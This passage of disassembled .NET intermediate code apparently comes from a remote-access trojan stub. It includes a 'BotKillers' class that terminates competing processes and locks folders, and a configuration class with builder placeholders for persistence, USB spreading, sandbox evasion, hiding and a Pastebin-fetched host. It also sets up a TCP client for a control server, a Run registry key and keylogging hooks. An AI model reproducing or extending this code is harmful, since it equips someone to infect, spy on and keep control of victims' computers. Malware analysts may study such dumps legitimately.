        IL_0041:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::MoveFile(string,
                                                                                                                             string)
        IL_0046:  ldarg.0
        IL_0047:  ldsfld     string [mscorlib]System.String::Empty
        IL_004c:  call       void [mscorlib]System.IO.File::WriteAllText(string,
                                                                         string)
        IL_0051:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.FileSystem::FreeFile()
        IL_0056:  ldarg.0
        IL_0057:  ldc.i4.1
        IL_0058:  ldc.i4.m1
        IL_0059:  ldc.i4.0
        IL_005a:  ldc.i4.m1
        IL_005b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.FileSystem::FileOpen(int32,
                                                                                                    string,
                                                                                                    valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.OpenMode,
                                                                                                    valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.OpenAccess,
                                                                                                    valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.OpenShare,
                                                                                                    int32)
        IL_0060:  ldarg.0
        IL_0061:  call       void BotKillers::KillFile(string)
        IL_0066:  leave.s    IL_008e

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0068:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_006d:  ldarg.0
        IL_006e:  newobj     instance void [mscorlib]System.IO.DirectoryInfo::.ctor(string)
        IL_0073:  newobj     instance void [mscorlib]System.Security.AccessControl.DirectorySecurity::.ctor()
        IL_0078:  stloc.1
        IL_0079:  ldloc.1
        IL_007a:  ldc.i4.1
        IL_007b:  ldc.i4.0
        IL_007c:  callvirt   instance void [mscorlib]System.Security.AccessControl.ObjectSecurity::SetAccessRuleProtection(bool,
                                                                                                                           bool)
        IL_0081:  ldloc.1
        IL_0082:  callvirt   instance void [mscorlib]System.IO.DirectoryInfo::SetAccessControl(class [mscorlib]System.Security.AccessControl.DirectorySecurity)
        IL_0087:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_008c:  leave.s    IL_008e

      }  // end handler
      IL_008e:  leave.s    IL_009c

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0090:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0095:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_009a:  leave.s    IL_009c

    }  // end handler
    IL_009c:  ret
  } // end of method BotKillers::DestroyFile

  .method public static bool  IsAdmin() cil managed
  {
    // Code size       41 (0x29)
    .maxstack  2
    .locals init (bool V_0,
             class [mscorlib]System.Security.Principal.WindowsIdentity V_1)
    .try
    {
      IL_0000:  call       class [mscorlib]System.Security.Principal.WindowsIdentity [mscorlib]System.Security.Principal.WindowsIdentity::GetCurrent()
      IL_0005:  stloc.1
      IL_0006:  ldloc.1
      IL_0007:  newobj     instance void [mscorlib]System.Security.Principal.WindowsPrincipal::.ctor(class [mscorlib]System.Security.Principal.WindowsIdentity)
      IL_000c:  ldc.i4     0x220
      IL_0011:  callvirt   instance bool [mscorlib]System.Security.Principal.WindowsPrincipal::IsInRole(valuetype [mscorlib]System.Security.Principal.WindowsBuiltInRole)
      IL_0016:  stloc.0
      IL_0017:  leave.s    IL_0027

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0019:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_001e:  ldc.i4.0
      IL_001f:  stloc.0
      IL_0020:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0025:  leave.s    IL_0027

    }  // end handler
    IL_0027:  ldloc.0
    IL_0028:  ret
  } // end of method BotKillers::IsAdmin

  .method public static void  AllowAccess(string location) cil managed
  {
    // Code size       43 (0x2b)
    .maxstack  4
    .locals init (string V_0,
             class [mscorlib]System.Security.AccessControl.DirectorySecurity V_1)
    .try
    {
      IL_0000:  ldarg.0
      IL_0001:  stloc.0
      IL_0002:  ldloc.0
      IL_0003:  newobj     instance void [mscorlib]System.IO.DirectoryInfo::.ctor(string)
      IL_0008:  newobj     instance void [mscorlib]System.Security.AccessControl.DirectorySecurity::.ctor()
      IL_000d:  stloc.1
      IL_000e:  ldloc.1
      IL_000f:  ldc.i4.0
      IL_0010:  ldc.i4.1
      IL_0011:  callvirt   instance void [mscorlib]System.Security.AccessControl.ObjectSecurity::SetAccessRuleProtection(bool,
                                                                                                                         bool)
      IL_0016:  ldloc.1
      IL_0017:  callvirt   instance void [mscorlib]System.IO.DirectoryInfo::SetAccessControl(class [mscorlib]System.Security.AccessControl.DirectorySecurity)
      IL_001c:  leave.s    IL_002a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_001e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0023:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0028:  leave.s    IL_002a

    }  // end handler
    IL_002a:  ret
  } // end of method BotKillers::AllowAccess

  .method public static void  TerminateProcessPath(string Path) cil managed
  {
    // Code size       196 (0xc4)
    .maxstack  4
    .locals init (class [System]System.Diagnostics.Process[] V_0,
             string[] V_1,
             int32 V_2,
             string V_3,
             int32 V_4,
             int32 V_5,
             class [System]System.Diagnostics.Process V_6)
    .try
    {
      IL_0000:  ldarg.0
      IL_0001:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
      IL_0006:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
      IL_000b:  callvirt   instance string [mscorlib]System.String::ToString()
      IL_0010:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0015:  brtrue     IL_00b5

      IL_001a:  ldarg.0
      IL_001b:  ldstr      "\\"
      IL_0020:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0025:  brfalse.s  IL_0057

      IL_0027:  ldarg.0
      IL_0028:  ldstr      "\\"
      IL_002d:  ldc.i4.m1
      IL_002e:  ldc.i4.0
      IL_002f:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                                string,
                                                                                                int32,
                                                                                                valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
      IL_0034:  stloc.1
      IL_0035:  ldc.i4.0
      IL_0036:  stloc.2
      IL_0037:  br.s       IL_0051

      IL_0039:  ldloc.1
      IL_003a:  ldloc.2
      IL_003b:  ldelem.ref
      IL_003c:  stloc.3
      IL_003d:  ldloc.3
      IL_003e:  ldstr      ".exe"
      IL_0043:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0048:  brfalse.s  IL_004d

      IL_004a:  ldloc.3
      IL_004b:  starg.s    Path
      IL_004d:  ldloc.2
      IL_004e:  ldc.i4.1
      IL_004f:  add.ovf
      IL_0050:  stloc.2
      IL_0051:  ldloc.2
      IL_0052:  ldloc.1
      IL_0053:  ldlen
      IL_0054:  conv.i4
      IL_0055:  blt.s      IL_0039

      IL_0057:  ldarg.0
      IL_0058:  ldstr      ".exe"
      IL_005d:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0062:  brfalse.s  IL_0076

      IL_0064:  ldarg.0
      IL_0065:  ldstr      ".exe"
      IL_006a:  ldsfld     string [mscorlib]System.String::Empty
      IL_006f:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_0074:  starg.s    Path
      IL_0076:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcesses()
      IL_007b:  stloc.0
      IL_007c:  ldloc.0
      IL_007d:  ldlen
      IL_007e:  conv.i4
      IL_007f:  ldc.i4.1
      IL_0080:  sub.ovf
      IL_0081:  stloc.s    V_4
      IL_0083:  ldc.i4.0
      IL_0084:  stloc.s    V_5
      IL_0086:  br.s       IL_00af

      IL_0088:  ldloc.0
      IL_0089:  ldloc.s    V_5
      IL_008b:  ldelem.ref
      IL_008c:  stloc.s    V_6
      IL_008e:  ldloc.s    V_6
      IL_0090:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
      IL_0095:  ldarg.0
      IL_0096:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_009b:  brfalse.s  IL_00a9

      IL_009d:  ldloc.s    V_6
      IL_009f:  callvirt   instance int32 [System]System.Diagnostics.Process::get_Id()
      IL_00a4:  call       void BotKillers::TerminateProcess(int32)
      IL_00a9:  ldloc.s    V_5
      IL_00ab:  ldc.i4.1
      IL_00ac:  add.ovf
      IL_00ad:  stloc.s    V_5
      IL_00af:  ldloc.s    V_5
      IL_00b1:  ldloc.s    V_4
      IL_00b3:  ble.s      IL_0088

      IL_00b5:  leave.s    IL_00c3

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00b7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00bc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00c1:  leave.s    IL_00c3

    }  // end handler
    IL_00c3:  ret
  } // end of method BotKillers::TerminateProcessPath

  .method public static void  TerminateProcess(int32 PID) cil managed
  {
    // Code size       147 (0x93)
    .maxstack  3
    .locals init (class [System]System.Diagnostics.Process V_0,
             class [mscorlib]System.Collections.IEnumerator V_1,
             class [System]System.Diagnostics.ProcessThread V_2,
             native int V_3)
    .try
    {
      IL_0000:  ldarg.0
      IL_0001:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
      IL_0006:  stloc.0
      IL_0007:  ldloc.0
      IL_0008:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
      IL_000d:  ldsfld     string [mscorlib]System.String::Empty
      IL_0012:  ldc.i4.0
      IL_0013:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0018:  brfalse.s  IL_0084

      .try
      {
        IL_001a:  ldloc.0
        IL_001b:  callvirt   instance class [System]System.Diagnostics.ProcessThreadCollection [System]System.Diagnostics.Process::get_Threads()
        IL_0020:  callvirt   instance class [mscorlib]System.Collections.IEnumerator [mscorlib]System.Collections.ReadOnlyCollectionBase::GetEnumerator()
        IL_0025:  stloc.1
        IL_0026:  br.s       IL_0066

        IL_0028:  ldloc.1
        IL_0029:  callvirt   instance object [mscorlib]System.Collections.IEnumerator::get_Current()
        IL_002e:  castclass  [System]System.Diagnostics.ProcessThread
        IL_0033:  stloc.2
        IL_0034:  ldc.i4.3
        IL_0035:  ldc.i4.1
        IL_0036:  ldloc.2
        IL_0037:  callvirt   instance int32 [System]System.Diagnostics.ProcessThread::get_Id()
        IL_003c:  conv.ovf.u4
        IL_003d:  call       native int BotKillers::OpenThread(valuetype BotKillers/ThreadAccess,
                                                               bool,
                                                               uint32)
        IL_0042:  stloc.3
        IL_0043:  ldloc.3
        IL_0044:  ldsfld     native int [mscorlib]System.IntPtr::Zero
        IL_0049:  call       bool [mscorlib]System.IntPtr::op_Inequality(native int,
                                                                         native int)
        IL_004e:  brfalse.s  IL_0066

        IL_0050:  ldloc.3
        IL_0051:  call       int32 BotKillers::SuspendThread(native int)
        IL_0056:  pop
        IL_0057:  ldloc.3
        IL_0058:  ldc.i4.1
        IL_0059:  call       bool BotKillers::TerminateThread(native int,
                                                              uint32)
        IL_005e:  pop
        IL_005f:  ldloc.3
        IL_0060:  call       bool BotKillers::CloseHandle(native int)
        IL_0065:  pop
        IL_0066:  ldloc.1
        IL_0067:  callvirt   instance bool [mscorlib]System.Collections.IEnumerator::MoveNext()
        IL_006c:  brtrue.s   IL_0028

        IL_006e:  leave.s    IL_0084

      }  // end .try
      finally
      {
        IL_0070:  ldloc.1
        IL_0071:  isinst     [mscorlib]System.IDisposable
        IL_0076:  brfalse.s  IL_0083

        IL_0078:  ldloc.1
        IL_0079:  isinst     [mscorlib]System.IDisposable
        IL_007e:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
        IL_0083:  endfinally
      }  // end handler
      IL_0084:  leave.s    IL_0092

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0086:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_008b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0090:  leave.s    IL_0092

    }  // end handler
    IL_0092:  ret
  } // end of method BotKillers::TerminateProcess

  .method private static pinvokeimpl("kernel32.dll" lasterr winapi) 
          bool  CloseHandle(native int hHandle) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("kernel32.dll" winapi) 
          native int  OpenThread(valuetype BotKillers/ThreadAccess dwDesiredAccess,
                                 bool bInheritHandle,
                                 uint32 dwThreadId) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("kernel32.dll" lasterr winapi) 
          int32  SuspendThread(native int hThread) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("kernel32.dll" winapi) 
          bool  TerminateThread(native int hThread,
                                uint32 dwExitCode) cil managed preservesig
  {
  }
} // end of class BotKillers

.class private auto ansi sealed beforefieldinit j.OK
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .class auto ansi sealed nested public TernaryRasterOperations
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname int32 value__
    .field public static literal valuetype j.OK/TernaryRasterOperations SRCCOPY = int32(0x00CC0020)
    .field public static literal valuetype j.OK/TernaryRasterOperations SRCPAINT = int32(0x00EE0086)
    .field public static literal valuetype j.OK/TernaryRasterOperations SRCAND = int32(0x008800C6)
    .field public static literal valuetype j.OK/TernaryRasterOperations SRCINVERT = int32(0x00660046)
    .field public static literal valuetype j.OK/TernaryRasterOperations SRCERASE = int32(0x00440328)
    .field public static literal valuetype j.OK/TernaryRasterOperations NOTSRCCOPY = int32(0x00330008)
    .field public static literal valuetype j.OK/TernaryRasterOperations NOTSRCERASE = int32(0x001100A6)
    .field public static literal valuetype j.OK/TernaryRasterOperations MERGECOPY = int32(0x00C000CA)
    .field public static literal valuetype j.OK/TernaryRasterOperations MERGEPAINT = int32(0x00BB0226)
    .field public static literal valuetype j.OK/TernaryRasterOperations PATCOPY = int32(0x00F00021)
    .field public static literal valuetype j.OK/TernaryRasterOperations PATPAINT = int32(0x00FB0A09)
    .field public static literal valuetype j.OK/TernaryRasterOperations PATINVERT = int32(0x005A0049)
    .field public static literal valuetype j.OK/TernaryRasterOperations DSTINVERT = int32(0x00550009)
    .field public static literal valuetype j.OK/TernaryRasterOperations BLACKNESS = int32(0x00000042)
    .field public static literal valuetype j.OK/TernaryRasterOperations WHITENESS = int32(0x00FF0062)
  } // end of class TernaryRasterOperations

  .class auto ansi sealed nested private SW
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname int32 value__
    .field public static literal valuetype j.OK/SW Hide = int32(0x00000000)
    .field public static literal valuetype j.OK/SW Normal = int32(0x00000001)
    .field public static literal valuetype j.OK/SW ShowMinimized = int32(0x00000002)
    .field public static literal valuetype j.OK/SW ShowMaximized = int32(0x00000003)
    .field public static literal valuetype j.OK/SW ShowNoActivate = int32(0x00000004)
    .field public static literal valuetype j.OK/SW Show = int32(0x00000005)
    .field public static literal valuetype j.OK/SW Minimize = int32(0x00000006)
    .field public static literal valuetype j.OK/SW ShowMinNoActive = int32(0x00000007)
    .field public static literal valuetype j.OK/SW ShowNA = int32(0x00000008)
    .field public static literal valuetype j.OK/SW Restore = int32(0x00000009)
    .field public static literal valuetype j.OK/SW ShowDefault = int32(0x0000000A)
    .field public static literal valuetype j.OK/SW ForceMinimize = int32(0x0000000B)
    .field public static literal valuetype j.OK/SW Max = int32(0x0000000B)
  } // end of class SW

  .class auto ansi sealed nested private GetWindow_Cmd
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname uint32 value__
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_HWNDFIRST = uint32(0x00000000)
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_HWNDLAST = uint32(0x00000001)
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_HWNDNEXT = uint32(0x00000002)
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_HWNDPREV = uint32(0x00000003)
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_OWNER = uint32(0x00000004)
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_CHILD = uint32(0x00000005)
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_ENABLEDPOPUP = uint32(0x00000006)
  } // end of class GetWindow_Cmd

  .field private class [mscorlib]System.Threading.Thread MouseThread
  .field private static literal int32 SRCCOPY = int32(0x00CC0020)
  .field private class [mscorlib]System.Random r
  .field public static string BinaryPath
  .field public static class [mscorlib]System.Collections.Generic.List`1<string> List
  .field public static class [mscorlib]System.Threading.Mutex _appMutex
  .field public static string sp
  .field public static string MTX
  .field public static bool PasteE
  .field public static string PASTEBIN
  .field public static bool Sched
  .field public static string SCHEDNAME
  .field public static bool ANYRUN
  .field public static string Bypass
  .field public static bool TaskMGR
  .field public static bool Melty
  .field public static bool KProc
  .field public static string Proc
  .field public static string SLP
  .field private static uint8[] b
  .field public static bool BD
  .field public static class [System]System.Net.Sockets.TcpClient C
  .field public static bool Cn
  .field public static string DR
  .field public static string SCREAM
  .field public static string WINMIN
  .field public static string EXE
  .field public static class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer F
  .field public static class [mscorlib]System.IO.FileStream FS
  .field public static string H
  .field public static bool Idr
  .field public static bool Anti_CH
  .field public static bool IsF
  .field public static bool USB_SP
  .field public static bool Isu
  .field public static class j.kl kq
  .field private static string lastcap
  .field public static class [mscorlib]System.IO.FileInfo LO
  .field private static class [mscorlib]System.IO.MemoryStream MeM
  .field public static object MT
  .field public static string P
  .field public static object PLG
  .field public static string RG
  .field public static string sf
  .field public static string VN
  .field public static string NTTA
  .field public static string VR
  .field public static string Y
  .field public static bool BOT_KILL
  .field public static bool HIDE_ME
  .field public static bool Persis
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       491 (0x1eb)
    .maxstack  1
    IL_0000:  ldstr      "[PasteE]"
    IL_0005:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_000a:  stsfld     bool j.OK::PasteE
    IL_000f:  ldstr      "[PASTEBIN]"
    IL_0014:  stsfld     string j.OK::PASTEBIN
    IL_0019:  ldstr      "[Sched]"
    IL_001e:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0023:  stsfld     bool j.OK::Sched
    IL_0028:  ldstr      "[SCHEDNAME]"
    IL_002d:  stsfld     string j.OK::SCHEDNAME
    IL_0032:  ldstr      "[ANYRUN]"
    IL_0037:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_003c:  stsfld     bool j.OK::ANYRUN
    IL_0041:  ldstr      "[Bypass]"
    IL_0046:  stsfld     string j.OK::Bypass
    IL_004b:  ldstr      "[TaskMGR]"
    IL_0050:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0055:  stsfld     bool j.OK::TaskMGR
    IL_005a:  ldstr      "[Melty]"
    IL_005f:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0064:  stsfld     bool j.OK::Melty
    IL_0069:  ldstr      "[KProc]"
    IL_006e:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0073:  stsfld     bool j.OK::KProc
    IL_0078:  ldstr      "[Proc]"
    IL_007d:  stsfld     string j.OK::Proc
    IL_0082:  ldstr      "[SLP]"
    IL_0087:  stsfld     string j.OK::SLP
    IL_008c:  ldc.i4     0x1401
    IL_0091:  newarr     [mscorlib]System.Byte
    IL_0096:  stsfld     uint8[] j.OK::b
    IL_009b:  ldstr      "[BD]"
    IL_00a0:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_00a5:  stsfld     bool j.OK::BD
    IL_00aa:  ldnull
    IL_00ab:  stsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
    IL_00b0:  ldc.i4.0
    IL_00b1:  stsfld     bool j.OK::Cn
    IL_00b6:  ldstr      "[DR]"
    IL_00bb:  stsfld     string j.OK::DR
    IL_00c0:  ldstr      "off"
    IL_00c5:  stsfld     string j.OK::SCREAM
    IL_00ca:  ldstr      "off"
    IL_00cf:  stsfld     string j.OK::WINMIN
    IL_00d4:  ldstr      "[EXE]"
    IL_00d9:  stsfld     string j.OK::EXE
    IL_00de:  newobj     instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::.ctor()
    IL_00e3:  stsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
    IL_00e8:  ldstr      "[H]"
    IL_00ed:  stsfld     string j.OK::H
    IL_00f2:  ldstr      "[Idr]"
    IL_00f7:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_00fc:  stsfld     bool j.OK::Idr
    IL_0101:  ldstr      "[Anti_CH]"
    IL_0106:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_010b:  stsfld     bool j.OK::Anti_CH
    IL_0110:  ldstr      "[Isf]"
    IL_0115:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_011a:  stsfld     bool j.OK::IsF
    IL_011f:  ldstr      "[USB_SP]"
    IL_0124:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0129:  stsfld     bool j.OK::USB_SP
    IL_012e:  ldstr      "[Isu]"
    IL_0133:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0138:  stsfld     bool j.OK::Isu
    IL_013d:  ldnull
    IL_013e:  stsfld     class j.kl j.OK::kq
    IL_0143:  ldstr      ""
    IL_0148:  stsfld     string j.OK::lastcap
    IL_014d:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::GetEntryAssembly()
    IL_0152:  callvirt   instance string [mscorlib]System.Reflection.Assembly::get_Location()
    IL_0157:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
    IL_015c:  stsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_0161:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_0166:  stsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
    IL_016b:  ldnull
    IL_016c:  stsfld     object j.OK::MT
    IL_0171:  ldstr      "[P]"
    IL_0176:  stsfld     string j.OK::P
    IL_017b:  ldnull
    IL_017c:  stsfld     object j.OK::PLG
    IL_0181:  ldstr      "[EXE]"
    IL_0186:  stsfld     string j.OK::RG
    IL_018b:  ldstr      "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    IL_0190:  stsfld     string j.OK::sf
    IL_0195:  ldstr      "[VN]"
    IL_019a:  stsfld     string j.OK::VN
    IL_019f:  ldstr      "WhyYouReverseMe..ImInnocent..LoveYouu.."
    IL_01a4:  stsfld     string j.OK::NTTA
    IL_01a9:  ldstr      "Platinum"
    IL_01ae:  stsfld     string j.OK::VR
    IL_01b3:  ldstr      "[Y]"
    IL_01b8:  stsfld     string j.OK::Y
    IL_01bd:  ldstr      "[BOTKILL]"
    IL_01c2:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_01c7:  stsfld     bool j.OK::BOT_KILL
    IL_01cc:  ldstr      "[HIDE_ME]"
    IL_01d1:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_01d6:  stsfld     bool j.OK::HIDE_ME
    IL_01db:  ldstr      "[Persis]"
    IL_01e0:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_01e5:  stsfld     bool j.OK::Persis
    IL_01ea:  ret
  } // end of method OK::.cctor

  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       30 (0x1e)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldnull
    IL_0008:  ldftn      void j.OK::Mouse()
    IL_000e:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_0013:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart)
    IL_0018:  stfld      class [mscorlib]System.Threading.Thread j.OK::MouseThread
    IL_001d:  ret
  } // end of method OK::.ctor

  .method private static void  _Lambda__1(object a0) cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerStepThroughAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       12 (0xc)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  castclass  uint8[]
    IL_0006:  call       void j.OK::Ind(uint8[])
    IL_000b:  ret
  } // end of method OK::_Lambda__1

  .method private static void  _Lambda__2(object a0,
                                          class [System]Microsoft.Win32.SessionEndingEventArgs a1) cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerStepThroughAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       6 (0x6)
    .maxstack  8
    IL_0000:  call       void j.OK::ED()
    IL_0005:  ret
  } // end of method OK::_Lambda__2

  .method public static string  ACT() cil managed
  {
    // Code size       108 (0x6c)
    .maxstack  3
    .locals init (string V_0,
             string V_1,
             native int V_2,
             string V_3,
             class [mscorlib]System.Exception V_4)
    .try
    {
      IL_0000:  call       native int j.OK::GetForegroundWindow()
      IL_0005:  stloc.2
      IL_0006:  ldloc.2
      IL_0007:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_000c:  call       bool [mscorlib]System.IntPtr::op_Equality(native int,
                                                                     native int)
      IL_0011:  brfalse.s  IL_001b

      IL_0013:  ldstr      ""
      IL_0018:  stloc.0
      IL_0019:  leave.s    IL_006a

      IL_001b:  ldloc.2
      IL_001c:  call       int64 [mscorlib]System.IntPtr::op_Explicit(native int)
      IL_0021:  call       int32 j.OK::GetWindowTextLength(int64)
      IL_0026:  ldc.i4.1
      IL_0027:  add.ovf
      IL_0028:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Space(int32)
      IL_002d:  stloc.3
      IL_002e:  ldloc.2
      IL_002f:  ldloca.s   V_3
      IL_0031:  ldloc.3
      IL_0032:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0037:  call       int32 j.OK::GetWindowText(native int,
                                                     string&,
                                                     int32)
      IL_003c:  pop
      IL_003d:  ldloca.s   V_3
      IL_003f:  call       string j.OK::ENB(string&)
      IL_0044:  stloc.1
      IL_0045:  leave.s    IL_0068

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0047:  dup
      IL_0048:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_004d:  stloc.s    V_4
      IL_004f:  ldloc.s    V_4
      IL_0051:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0056:  ldstr      ""
      IL_005b:  stloc.1
      IL_005c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0061:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0066:  leave.s    IL_0068

    }  // end handler
    IL_0068:  ldloc.1
    IL_0069:  stloc.0
    IL_006a:  ldloc.0
    IL_006b:  ret
  } // end of method OK::ACT

  .method public static string  RN(int32 c) cil managed
  {
    // Code size       74 (0x4a)
    .maxstack  5
    .locals init (class [mscorlib]System.Random V_0,
             string V_1,
             string V_2,
             int32 V_3,
             int32 V_4)
    IL_0000:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.VBMath::Randomize()
    IL_0005:  newobj     instance void [mscorlib]System.Random::.ctor()
    IL_000a:  stloc.0
    IL_000b:  ldstr      ""
    IL_0010:  stloc.1
    IL_0011:  ldstr      "abcdefghijklmnopqrstuvwxyz"
    IL_0016:  stloc.2
    IL_0017:  ldarg.0
    IL_0018:  stloc.3
    IL_0019:  ldc.i4.1
    IL_001a:  stloc.s    V_4
    IL_001c:  br.s       IL_0043

    IL_001e:  ldloc.1
    IL_001f:  ldloc.2
    IL_0020:  ldloc.0
